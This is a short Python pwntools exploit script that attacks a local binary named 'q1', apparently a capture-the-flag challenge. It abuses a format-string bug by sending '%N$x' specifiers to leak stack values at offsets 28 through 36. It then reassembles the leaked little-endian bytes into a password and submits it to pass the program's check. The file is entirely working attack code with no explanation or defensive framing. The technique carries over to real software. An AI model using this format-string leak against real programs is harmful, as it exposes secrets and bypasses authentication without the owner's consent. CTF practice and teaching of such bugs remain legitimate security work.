#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack, unpack

conn = process('./q1')
welcome = conn.recvuntil('?')
print welcome

leak = lambda x: ".%{offset}$x".format(offset=x)

# need to extract the password with 2 attempts
payload1 = leak(28) + leak(29) + leak(30) + leak(31) + leak(32)
payload2 = leak(33) + leak(34) + leak(35) + leak(36) 

# send the first payload
conn.sendline(payload1)
conn.recvuntil('guessed:')
resp = conn.recvuntil('\n').rstrip()

# fix shit and deal with little endian
nums = resp.split('.')[1:] # ignore the first, it's an empty space
nums[0] = nums[0][:2]
password = ''.join(nums[::-1]).decode('hex')[::-1] # ::-1 cuz little endian


# send the second
conn.sendline(payload2)
resp = conn.recvuntil('guessed:')
resp = conn.recvuntil('\n').rstrip()

# fix shit and deal with little endian
nums = resp.split('.')[1:]
nums[-1] = nums[-1][2:]
password += ''.join(nums[::-1]).decode('hex')[::-1]


conn.sendline(password)
print conn.recv()
print conn.recv()
conn.close()


